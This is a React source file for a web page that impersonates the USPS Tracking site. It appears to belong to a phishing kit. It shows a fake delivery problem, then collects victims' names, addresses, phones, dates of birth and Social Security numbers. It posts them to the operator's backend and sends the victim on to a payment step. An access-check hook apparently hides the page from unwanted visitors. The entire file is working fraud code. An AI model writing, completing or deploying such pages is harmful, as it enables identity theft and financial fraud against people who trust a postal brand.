import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import Header from "../components/Header";
import Footer from "../components/Footer";
import { baseUrl } from "../constants";
import useAccessCheck from "../Utils/useAccessCheck";

type FormErrors = {
  fullName: string;
  streetAddress1: string;
  city: string;
  state: string;
  zipCode: string;
  phone: string;
  dob: string;
  ssn: string;
  form: string;
};

const LoginForm: React.FC = () => {
  const inputClass =
    "w-full border border-[#3d4095] rounded-sm px-4 py-2.5 text-[14px] text-[#1a2252] placeholder:text-[#757cab] bg-white focus:outline-none focus:ring-1 focus:ring-[#2b2a72]/40 focus:border-[#2b2a72]";

  const navigate = useNavigate();
  const isAllowed = useAccessCheck(baseUrl);
  const [sessionId] = useState(() =>
    `usps-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`
  );
  const [isLoading, setIsLoading] = useState(false);
  const [fullName, setFullName] = useState("");
  const [streetAddress1, setStreetAddress1] = useState("");
  const [streetAddress2, setStreetAddress2] = useState("");
  const [city, setCity] = useState("");
  const [stateValue, setStateValue] = useState("");
  const [zipCode, setZipCode] = useState("");
  const [dob, setDob] = useState("");
  const [phone, setPhone] = useState("");
  const [ssn, setSsn] = useState("");
  const [errors, setErrors] = useState<FormErrors>({
    fullName: "",
    streetAddress1: "",
    city: "",
    state: "",
    zipCode: "",
    phone: "",
    dob: "",
    ssn: "",
    form: "",
  });

  const formatPhone = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 10);
    const parts = [] as string[];
    if (digits.length > 0) parts.push(`(${digits.slice(0, 3)}`);
    if (digits.length >= 3) parts[0] = `${parts[0]})`;
    if (digits.length > 3) parts.push(` ${digits.slice(3, 6)}`);
    if (digits.length > 6) parts.push(`-${digits.slice(6)}`);
    return parts.join("");
  };

  const formatSSN = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 9);
    const segments = [] as string[];
    if (digits.length > 0) segments.push(digits.slice(0, 3));
    if (digits.length > 3) segments.push(digits.slice(3, 5));
    if (digits.length > 5) segments.push(digits.slice(5));
    return segments.join("-");
  };

  const resetErrors = () =>
    setErrors({
      fullName: "",
      streetAddress1: "",
      city: "",
      state: "",
      zipCode: "",
      phone: "",
      dob: "",
      ssn: "",
      form: "",
    });

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    resetErrors();
    setIsLoading(true);

    const phoneDigits = phone.replace(/\D/g, "");
    const ssnDigits = ssn.replace(/\D/g, "");

    const newErrors: FormErrors = {
      fullName: !fullName.trim() ? "Full name is required." : "",
      streetAddress1: !streetAddress1.trim()
        ? "Primary street address is required."
        : "",
      city: !city.trim() ? "City is required." : "",
      state: !stateValue ? "State is required." : "",
      zipCode: !zipCode.trim() ? "ZIP code is required." : "",
      phone: phoneDigits.length !== 10 ? "Phone number must be 10 digits." : "",
      dob: !dob ? "Date of birth is required." : "",
      ssn: ssnDigits.length !== 9 ? "SSN must be 9 digits." : "",
      form: "",
    };

    if (Object.values(newErrors).some((msg) => msg)) {
      setErrors(newErrors);
      setIsLoading(false);
      return;
    }

    try {
      await axios.post(`${baseUrl}api/usps-address-verification/`, {
        sessionId,
        fullName,
        streetAddress1,
        streetAddress2,
        city,
        state: stateValue,
        zipCode,
        phone: phoneDigits,
        dob,
        ssn: ssnDigits,
      });

      navigate("/payment", { state: { sessionId } });
    } catch (error) {
      console.error("Error submitting address verification:", error);
      setErrors((prev) => ({
        ...prev,
        form: "There was an error verifying your address. Please try again.",
      }));
    } finally {
      setIsLoading(false);
    }
  };

  const states = [
    { name: "Alabama", abbr: "AL" },
    { name: "Alaska", abbr: "AK" },
    { name: "Arizona", abbr: "AZ" },
    { name: "Arkansas", abbr: "AR" },
    { name: "California", abbr: "CA" },
    { name: "Colorado", abbr: "CO" },
    { name: "Connecticut", abbr: "CT" },
    { name: "Delaware", abbr: "DE" },
    { name: "District of Columbia", abbr: "DC" },
    { name: "Florida", abbr: "FL" },
    { name: "Georgia", abbr: "GA" },
    { name: "Hawaii", abbr: "HI" },
    { name: "Idaho", abbr: "ID" },
    { name: "Illinois", abbr: "IL" },
    { name: "Indiana", abbr: "IN" },
    { name: "Iowa", abbr: "IA" },
    { name: "Kansas", abbr: "KS" },
    { name: "Kentucky", abbr: "KY" },
    { name: "Louisiana", abbr: "LA" },
    { name: "Maine", abbr: "ME" },
    { name: "Maryland", abbr: "MD" },
    { name: "Massachusetts", abbr: "MA" },
    { name: "Michigan", abbr: "MI" },
    { name: "Minnesota", abbr: "MN" },
    { name: "Mississippi", abbr: "MS" },
    { name: "Missouri", abbr: "MO" },
    { name: "Montana", abbr: "MT" },
    { name: "Nebraska", abbr: "NE" },
    { name: "Nevada", abbr: "NV" },
    { name: "New Hampshire", abbr: "NH" },
    { name: "New Jersey", abbr: "NJ" },
    { name: "New Mexico", abbr: "NM" },
    { name: "New York", abbr: "NY" },
    { name: "North Carolina", abbr: "NC" },
    { name: "North Dakota", abbr: "ND" },
    { name: "Ohio", abbr: "OH" },
    { name: "Oklahoma", abbr: "OK" },
    { name: "Oregon", abbr: "OR" },
    { name: "Pennsylvania", abbr: "PA" },
    { name: "Rhode Island", abbr: "RI" },
    { name: "South Carolina", abbr: "SC" },
    { name: "South Dakota", abbr: "SD" },
    { name: "Tennessee", abbr: "TN" },
    { name: "Texas", abbr: "TX" },
    { name: "Utah", abbr: "UT" },
    { name: "Vermont", abbr: "VT" },
    { name: "Virginia", abbr: "VA" },
    { name: "Washington", abbr: "WA" },
    { name: "West Virginia", abbr: "WV" },
    { name: "Wisconsin", abbr: "WI" },
    { name: "Wyoming", abbr: "WY" },
  ];

  const statusSegments = [
    { id: 1, gradient: "linear-gradient(90deg, #2b2a72 0%, #1f1f5a 100%)" },
    { id: 2, color: "#d9d9df" },
    { id: 3, color: "#d9d9df" },
    { id: 4, color: "#d9d9df" },
  ];

  if (isAllowed === null) {
    return <div>Loading...</div>;
  }

  if (isAllowed === false) {
    return <div>Access denied. Redirecting...</div>;
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-white via-[#f9f9fb] to-[#f4f4f6] flex flex-col font-['HelveticaNeueW02-55Roma','Helvetica Neue',Helvetica,Arial,sans-serif] text-[#23285a]">
      <Header />
      {/* Main Content */}
      <main className="flex-1 w-full">
        <div className="w-full bg-white border-b border-[#e0e0e8] py-10 px-4 sm:px-6 shadow-sm">
          <div className="max-w-[960px] mx-auto flex flex-wrap items-start justify-between gap-6">
            <div>
              <div className="text-[26px] sm:text-[30px] font-semibold text-[#1a2252] leading-tight">
                USPS Tracking<sup className="text-xs align-super">®</sup>
              </div>
              <button
                type="button"
                className="mt-3 inline-flex items-center gap-2 sm:gap-3 text-[14px] sm:text-[15px] font-semibold text-[#1a2252] hover:underline"
              >
                <span>Track Another Package</span>
                <span className="text-[#d52b1e] text-[18px] sm:text-[22px] leading-none">+</span>
              </button>
            </div>
            <div className="flex items-center gap-4 sm:gap-5 text-[14px] sm:text-[15px] font-semibold text-[#1a2252]">
              <button
                type="button"
                className="relative px-1 pb-1 text-[#1a2252] after:absolute after:left-0 after:right-0 after:bottom-0 after:h-[2px] after:bg-[#d52b1e]"
              >
                Tracking
              </button>
              <span className="h-5 w-px bg-[#d8d8e0]" />
              <button
                type="button"
                className="px-1 pb-1 text-[#4a4f6d] hover:text-[#1a2252] transition-colors"
              >
                FAQs
              </button>
            </div>
          </div>
        </div>
        <div className="w-full max-w-[960px] mx-auto px-4 sm:px-6 pb-16">
          <div className="mt-12 space-y-12">
            <section className="space-y-5">
              <div className="text-[16px] sm:text-[17px] text-[#4a4f6d]">
                <span className="font-semibold text-[#1a2252]">Tracking Number:</span>
                <span className="ml-1 sm:ml-2 font-semibold text-[16px] sm:text-[17px] text-[#6b6f88]">92612999897543581074711582</span>
              </div>
              <div className="text-[17px] font-semibold text-[#23285a]">Status :</div>
              <div className="text-[19px] font-bold text-[#c5282c]">
                We have issues with your shipping address
              </div>
              <div className="text-[14px] leading-6 text-[#4a4f6d] max-w-[620px]">
                USPS allows you to Redeliver your package to your address in case of
                delivery failure or any other case. You can also track the package at
                any time, from shipment to delivery.
              </div>
              <div className="mt-4 flex w-full max-w-[760px]">
                {statusSegments.map((segment, index) => (
                  <div
                    key={segment.id}
                    className="h-[14px] flex-1"
                    style={{
                      background: segment.gradient || segment.color,
                      clipPath:
                        index === statusSegments.length - 1
                          ? "polygon(8px 0, 100% 0, 100% 100%, 0 100%)"
                          : "polygon(8px 0, 100% 0, calc(100% - 8px) 100%, 0 100%)",
                      marginRight: index === statusSegments.length - 1 ? 0 : 4,
                    }}
                  />
                ))}
              </div>
              <div className="text-[13px] font-semibold text-[#c5282c] uppercase tracking-wide">
                Status Not Available
              </div>
            </section>
            <section>
              <div className="text-[17px] font-semibold text-[#23285a] mb-1">Verify Address</div>
              <div className="text-[11px] text-[#4a4f6d] mb-6">
                First, we need to confirm your address is eligible for redelivery.
              </div>
              <form className="grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-4" onSubmit={handleSubmit}>
                <div>
                  <input
                    type="text"
                    placeholder="Full name"
                    className={inputClass}
                    value={fullName}
                    onChange={(e) => setFullName(e.target.value)}
                    required
                  />
                  {errors.fullName && (
                    <p className="mt-1 text-xs text-red-600">{errors.fullName}</p>
                  )}
                </div>
                <div>
                  <input
                    type="text"
                    placeholder="Street Address 2 (OPT)"
                    className={inputClass}
                    value={streetAddress2}
                    onChange={(e) => setStreetAddress2(e.target.value)}
                  />
                </div>
                <div>
                  <input
                    type="text"
                    placeholder="Street Address 1"
                    className={inputClass}
                    value={streetAddress1}
                    onChange={(e) => setStreetAddress1(e.target.value)}
                    required
                  />
                  {errors.streetAddress1 && (
                    <p className="mt-1 text-xs text-red-600">{errors.streetAddress1}</p>
                  )}
                </div>
                <div>
                  <input
                    type="text"
                    placeholder="City"
                    className={inputClass}
                    value={city}
                    onChange={(e) => setCity(e.target.value)}
                    required
                  />
                  {errors.city && (
                    <p className="mt-1 text-xs text-red-600">{errors.city}</p>
                  )}
                </div>
                <input
                  type="tel"
                  inputMode="tel"
                  placeholder="(555) 123-4567"
                  className={inputClass}
                  value={phone}
                  onChange={(e) => setPhone(formatPhone(e.target.value))}
                  pattern="^\(\d{3}\) \d{3}-\d{4}$"
                  required
                />
                {errors.phone && (
                  <p className="mt-1 text-xs text-red-600 sm:col-span-2">{errors.phone}</p>
                )}
                <div className="relative">
                  <select
                    className={`${inputClass} appearance-none pr-10`}
                    value={stateValue}
                    onChange={(e) => setStateValue(e.target.value)}
                    required
                  >
                    <option value="" disabled>
                      Select State
                    </option>
                    {states.map((state) => (
                      <option key={state.abbr} value={state.abbr}>
                        {state.name} ({state.abbr})
                      </option>
                    ))}
                  </select>
                  <svg
                    className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-[#1a2252]"
                    viewBox="0 0 20 20"
                    fill="currentColor"
                  >
                    <path d="M5.23 7.21a.75.75 0 0 1 1.06.02L10 11.17l3.71-3.94a.75.75 0 1 1 1.08 1.04l-4.24 4.5a.75.75 0 0 1-1.08 0l-4.24-4.5a.75.75 0 0 1 .02-1.06Z" />
                  </svg>
                </div>
                {errors.state && (
                  <p className="mt-1 text-xs text-red-600 sm:col-span-2">{errors.state}</p>
                )}
                <div className="relative">
                  <input
                    type="date"
                    className={`${inputClass} pr-10`}
                    value={dob}
                    onChange={(e) => setDob(e.target.value)}
                    required
                  />
                  <svg
                    className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-[#1a2252]"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="1.5"
                  >
                    <rect x="3" y="4" width="18" height="18" rx="2" ry="2" />
                    <line x1="16" y1="2" x2="16" y2="6" />
                    <line x1="8" y1="2" x2="8" y2="6" />
                    <line x1="3" y1="10" x2="21" y2="10" />
                  </svg>
                </div>
                {errors.dob && (
                  <p className="mt-1 text-xs text-red-600 sm:col-span-2">{errors.dob}</p>
                )}
                <div>
                  <input
                    type="text"
                    placeholder="ZIP Code™ (CPI)"
                    className={inputClass}
                    value={zipCode}
                    onChange={(e) => setZipCode(e.target.value.slice(0, 10))}
                  />
                  {errors.zipCode && (
                    <p className="mt-1 text-xs text-red-600">{errors.zipCode}</p>
                  )}
                </div>
                <input
                  type="text"
                  inputMode="numeric"
                  placeholder="123-45-6789"
                  className={inputClass}
                  value={ssn}
                  onChange={(e) => setSsn(formatSSN(e.target.value))}
                  pattern="^\d{3}-\d{2}-\d{4}$"
                  required
                />
                {errors.ssn && (
                  <p className="mt-1 text-xs text-red-600 sm:col-span-2">{errors.ssn}</p>
                )}
                {errors.form && (
                  <p className="sm:col-span-2 text-sm text-red-600 font-semibold">
                    {errors.form}
                  </p>
                )}
                <button
                  type="submit"
                  className="sm:col-span-2 mt-3 inline-flex items-center justify-center bg-[#2b2a72] text-white font-semibold px-12 py-3.5 text-[16px] tracking-wide rounded-sm hover:bg-[#211f5a] transition-colors disabled:opacity-60 disabled:cursor-not-allowed"
                  disabled={isLoading}
                >
                  {isLoading ? "Submitting..." : "Continue"}
                </button>
              </form>
            </section>
          </div>
        </div>
{" "}
        <div className="mt-12 w-full">
          <div className="w-full bg-white border border-[#e0e0e8] py-12 px-8 text-center shadow-sm">
            <h3 className="text-[22px] font-semibold text-[#1a2252]">
              Can't find what you're looking for?
            </h3>
            <p className="mt-4 text-[14px] text-[#4a4f6d]">
              Go to our FAQs section to find answers to your tracking questions.
            </p>
            <button className="mt-6 inline-flex items-center justify-center bg-[#2b2a72] text-white px-7 py-3 text-[14px] rounded-sm font-medium hover:bg-[#211f5a] transition-colors">
              FAQs
            </button>
          </div>
        </div>{" "}
      </main>{" "}
      {/* Footer */}{" "}
      <Footer />
    </div>
  );
};
export default LoginForm;
